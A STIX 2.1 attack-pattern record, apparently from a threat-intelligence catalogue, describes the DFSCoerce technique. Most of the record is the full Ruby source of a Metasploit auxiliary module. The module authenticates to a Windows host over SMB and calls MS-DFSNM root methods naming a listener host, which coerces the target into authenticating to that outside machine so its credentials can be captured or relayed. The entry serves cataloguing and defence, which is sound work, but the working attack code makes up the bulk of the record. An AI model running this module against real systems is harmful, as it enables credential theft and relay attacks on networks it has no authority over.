{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8a959621-8fe2-44c1-b16b-279ddf4c65ae",
    "created": "2024-08-14T16:26:52.947582Z",
    "modified": "2024-08-14T16:26:52.947585Z",
    "name": "DFSCoerce",
    "description": " Coerce an authentication attempt over SMB to other machines via MS-DFSNM methods. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/dcerpc/dfscoerce.rb",
            "external_id": "dfscoerce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Wh04m1001/DFSCoerce"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'windows_error'\nrequire 'ruby_smb'\nrequire 'ruby_smb/error'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n  include Msf::Auxiliary::Scanner\n\n  Dfsnm = RubySMB::Dcerpc::Dfsnm\n\n  METHODS = %w[NetrDfsAddStdRoot NetrDfsRemoveStdRoot].freeze\n\n  def initialize\n    super(\n      'Name' => 'DFSCoerce',\n      'Description' => %q{\n        Coerce an authentication attempt over SMB to other machines via MS-DFSNM methods.\n      },\n      'Author' => [\n        'Wh04m1001',\n        'xct_de',\n        'Spencer McIntyre'\n      ],\n      'References' => [\n        [ 'URL', 'https://github.com/Wh04m1001/DFSCoerce' ]\n      ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptString.new('LISTENER', [ true, 'The host listening for the incoming connection', Rex::Socket.source_address ]),\n        OptEnum.new('METHOD', [ true, 'The RPC method to use for triggering', 'Automatic', ['Automatic'] + METHODS ])\n      ]\n    )\n  end\n\n  def connect_dfsnm\n    vprint_status('Connecting to Distributed File System (DFS) Namespace Management Protocol')\n    netdfs = @tree.open_file(filename: 'netdfs', write: true, read: true)\n\n    vprint_status('Binding to \\\\netdfs...')\n    netdfs.bind(endpoint: RubySMB::Dcerpc::Dfsnm)\n    vprint_good('Bound to \\\\netdfs')\n\n    netdfs\n  end\n\n  def run_host(_ip)\n    begin\n      connect\n    rescue Rex::ConnectionError => e\n      fail_with(Failure::Unreachable, e.message)\n    end\n\n    begin\n      smb_login\n    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e\n      fail_with(Failure::NoAccess, \"Unable to authenticate ([#{e.class}] #{e}).\")\n    end\n\n    begin\n      @tree = simple.client.tree_connect(\"\\\\\\\\#{sock.peerhost}\\\\IPC$\")\n    rescue RubySMB::Error::RubySMBError => e\n      fail_with(Failure::Unreachable, \"Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).\")\n    end\n\n    begin\n      dfsnm = connect_dfsnm\n    rescue RubySMB::Error::UnexpectedStatusCode => e\n      if e.status_code == ::WindowsError::NTStatus::STATUS_ACCESS_DENIED\n        fail_with(Failure::NoAccess, 'Connection failed (STATUS_ACCESS_DENIED)')\n      end\n\n      fail_with(Failure::UnexpectedReply, \"Connection failed (#{e.status_code.name})\")\n    rescue RubySMB::Dcerpc::Error::FaultError => e\n      elog(e.message, error: e)\n      fail_with(Failure::UnexpectedReply, \"Connection failed (DCERPC fault: #{e.status_name})\")\n    end\n\n    begin\n      case datastore['METHOD']\n      when 'NetrDfsAddStdRoot'\n        dfsnm.netr_dfs_add_std_root(datastore['LISTENER'], 'share', comment: Faker::Hacker.say_something_smart)\n      when 'NetrDfsRemoveStdRoot', 'Automatic'\n        # use this technique by default, it's the original and doesn't require a comment\n        dfsnm.netr_dfs_remove_std_root(datastore['LISTENER'], 'share')\n      end\n    rescue RubySMB::Dcerpc::Error::DfsnmError => e\n      case e.status_code\n      when ::WindowsError::Win32::ERROR_ACCESS_DENIED\n        # this should be the response even if LISTENER captured the credentials (MSF, Responder, etc.)\n        print_good('Server responded with ERROR_ACCESS_DENIED which indicates that the attack was successful')\n      when ::WindowsError::Win32::ERROR_BAD_NETPATH\n        # this should be the response even if LISTENER was inaccessible\n        print_good('Server responded with ERROR_BAD_NETPATH which indicates that the attack was successful')\n      else\n        print_status(\"Server responded with #{e.status_code.name} (#{e.status_code.description})\")\n      end\n    end\n  end\nend\n"
}